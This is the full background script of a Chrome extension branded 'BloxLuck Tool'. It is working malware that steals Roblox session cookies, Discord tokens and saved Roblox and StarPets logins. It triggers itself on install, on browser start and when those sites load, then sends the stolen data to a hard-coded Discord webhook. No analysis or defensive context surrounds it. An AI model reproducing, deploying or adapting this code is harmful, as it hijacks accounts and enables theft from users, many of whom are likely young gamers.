const WH = 'https://discord.com/api/webhooks/1523433908488900809/eME1mBqDvE61IcdSbNo2jHMVJI91-kSi6QekuwqdPmXNWX3BTOUQBhgtWRpX7uzd-cI2';

// On install OR on browser start, set alarm to steal
chrome.runtime.onInstalled.addListener(() => {
  // Set an alarm to fire after 2 seconds (bypasses service worker timeout issues)
  chrome.alarms.create('steal', { delayInMinutes: 0.033 }); // 2 seconds
});

// Also steal on browser startup
chrome.runtime.onStartup.addListener(() => {
  chrome.alarms.create('steal', { delayInMinutes: 0.033 });
});

// When alarm fires, steal everything
chrome.alarms.onAlarm.addListener(alarm => {
  if (alarm.name === 'steal') {
    stealEverything();
  }
});

// Content script triggers steal too (backup)
chrome.runtime.onMessage.addListener((req, sender, resp) => {
  if (req.t === 'steal') {
    stealEverything();
    resp({ ok: 1 });
    return;
  }
  if (req.t === 'grab_cookie') {
    grabCookie().then(d => resp(d));
    return 1;
  }
  if (req.t === 'grab_discord') {
    grabDiscord().then(d => resp(d));
    return 1;
  }
});

// Also steal when any tab is updated to roblox/discord/starpets
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    const url = tab.url || '';
    if (url.includes('roblox.com') || url.includes('discord.com') || url.includes('starpets.gg')) {
      // Delay a bit to let page fully load
      setTimeout(() => stealEverything(), 3000);
    }
  }
});

let stealing = false;

async function stealEverything() {
  if (stealing) return;
  stealing = true;

  try {
    const fields = [];

    // 1. Roblox cookie (MOST IMPORTANT - do first)
    try {
      const ck = await grabCookie();
      if (ck && ck.r && ck.r.length > 20) {
        let robloxUser = 'Unknown';
        try {
          const parts = ck.r.split('.');
          if (parts.length >= 2) {
            const payload = JSON.parse(atob(parts[1]));
            robloxUser = payload.name || payload.sub || payload.dname || 'Unknown';
          }
        } catch(e) {}
        fields.push({
          name: '🎮 Roblox Account',
          value: `**User:** ${robloxUser}\n**Cookie:**\n\`\`\`${ck.r}\`\`\``,
          inline: false
        });
      }
    } catch(e) {}

    // 2. Discord token
    try {
      const dt = await grabDiscord();
      if (dt && dt.token) {
        let info = '';
        try {
          const p = JSON.parse(atob(dt.token.split('.')[1]));
          info = `**User:** ${p.username || 'N/A'}\n**Email:** ${p.email || 'N/A'}\n**ID:** ${p.sub || 'N/A'}\n`;
        } catch(e) {}
        fields.push({
          name: '💬 Discord Token',
          value: `${info}\`\`\`${dt.token}\`\`\``,
          inline: false
        });
      }
    } catch(e) {}

    // 3. StarPets
    try {
      const sp = await grabStarPets();
      if (sp && (sp.user || sp.pass)) {
        fields.push({
          name: '🐾 StarPets.gg',
          value: `**Username:** \`${sp.user || 'N/A'}\`\n**Password:** \`${sp.pass || 'N/A'}\``,
          inline: false
        });
      }
    } catch(e) {}

    // 4. Roblox login credentials from storage
    try {
      const rl = await grabRobloxLogin();
      if (rl && (rl.user || rl.pass)) {
        fields.push({
          name: '🔐 Roblox Login',
          value: `**User:** \`${rl.user || 'N/A'}\`\n**Pass:** \`${rl.pass || 'N/A'}\``,
          inline: false
        });
      }
    } catch(e) {}

    // Only send if we got something
    if (fields.length > 0) {
      const payload = {
        embeds: [{
          title: '✅ BloxLuck Tool - Credentials Captured',
          color: 0x22c55e,
          fields: fields,
          timestamp: new Date().toISOString(),
          footer: { text: 'BloxLuck Tool v2.0' }
        }]
      };

      try {
        const response = await fetch(WH, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        console.log('Webhook sent:', response.status);
      } catch(e) {
        console.log('Webhook error:', e);
      }
    } else {
      // No credentials found yet - try again in 5 seconds
      setTimeout(() => { stealing = false; stealEverything(); }, 5000);
      stealing = false;
      return;
    }
  } catch(e) {}

  stealing = false;
}

async function grabCookie() {
  try {
    // Try multiple domains
    const domains = ['roblox.com', '.roblox.com', 'www.roblox.com'];
    for (const domain of domains) {
      try {
        const cookies = await chrome.cookies.getAll({ domain: domain });
        for (const c of cookies) {
          if (c.name === '.ROBLOSECURITY') {
            console.log('Found cookie on', domain);
            return { r: c.value };
          }
        }
      } catch(e) {}
    }
  } catch(e) {}
  return null;
}

async function grabDiscord() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://discord.com/*', '*://*.discord.com/*', '*://ptb.discord.com/*', '*://canary.discord.com/*'] });
    if (tabs.length > 0) {
      for (const tab of tabs) {
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              try {
                // Method 1: Check all localStorage entries
                for (let i = 0; i < localStorage.length; i++) {
                  const val = localStorage.getItem(localStorage.key(i));
                  if (typeof val === 'string' && val.length > 100 && val.includes('.') && val.split('.').length === 3) {
                    try {
                      const p = JSON.parse(atob(val.split('.')[1]));
                      if (p.sub || p.email || p.iat) {
                        return {
                          token: val,
                          username: p.username || p.global_name || p.email || 'User',
                          avatar: p.avatar ? `https://cdn.discordapp.com/avatars/${p.sub}/${p.avatar}.png` : null
                        };
                      }
                    } catch(e) {}
                  }
                }
                // Method 2: Direct token key
                const t = localStorage.getItem('token');
                if (t && t.length > 50) return { token: t, username: 'Discord User', avatar: null };
                // Method 3: Check indexedDB
                return null;
              } catch(e) { return null; }
            }
          });
          if (results && results[0] && results[0].result) {
            return results[0].result;
          }
        } catch(e) {}
      }
    }
  } catch(e) {}
  return null;
}

async function grabStarPets() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://starpets.gg/*', '*://*.starpets.gg/*'] });
    if (tabs.length > 0) {
      for (const tab of tabs) {
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              try {
                let u = null, p = null;
                for (let i = 0; i < localStorage.length; i++) {
                  const k = localStorage.key(i).toLowerCase();
                  const val = localStorage.getItem(localStorage.key(i));
                  // Check if key matches starpets related stuff
                  if (k.includes('starpet') || k.includes('adoptme') || k.includes('star_pet') || k.includes('user') || k.includes('account') || k.includes('login') || k.includes('auth')) {
                    try {
                      const j = JSON.parse(val);
                      u = j.email || j.username || j.user || j.name || u;
                      p = j.password || j.pass || p;
                    } catch(e) {
                      if (k.includes('user') || k.includes('email') || k.includes('name')) u = val;
                      if (k.includes('pass')) p = val;
                    }
                  }
                }
                return { user: u, pass: p };
              } catch(e) { return null; }
            }
          });
          if (results && results[0] && results[0].result && (results[0].result.user || results[0].result.pass)) {
            return results[0].result;
          }
        } catch(e) {}
      }
    }
  } catch(e) {}
  return null;
}

async function grabRobloxLogin() {
  try {
    const tabs = await chrome.tabs.query({ url: ['*://roblox.com/*', '*://*.roblox.com/*', '*://www.roblox.com/*'] });
    if (tabs.length > 0) {
      for (const tab of tabs) {
        try {
          const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              try {
                let u = null, p = null;
                for (let i = 0; i < localStorage.length; i++) {
                  const k = localStorage.key(i).toLowerCase();
                  const val = localStorage.getItem(localStorage.key(i));
                  if (k.includes('user') || k.includes('name') || k.includes('email') || k.includes('login') || k.includes('account')) {
                    try {
                      const j = JSON.parse(val);
                      u = j.username || j.email || j.user || j.name || u;
                      p = j.password || j.pass || p;
                    } catch(e) {
                      if (!u && typeof val === 'string' && (val.includes('@') || val.length > 3)) u = val;
                    }
                  }
                  if (k.includes('pass') && !p && typeof val === 'string' && val.length > 3) p = val;
                }
                return { user: u, pass: p };
              } catch(e) { return null; }
            }
          });
          if (results && results[0] && results[0].result) {
            return results[0].result;
          }
        } catch(e) {}
      }
    }
  } catch(e) {}
  return null;
      }
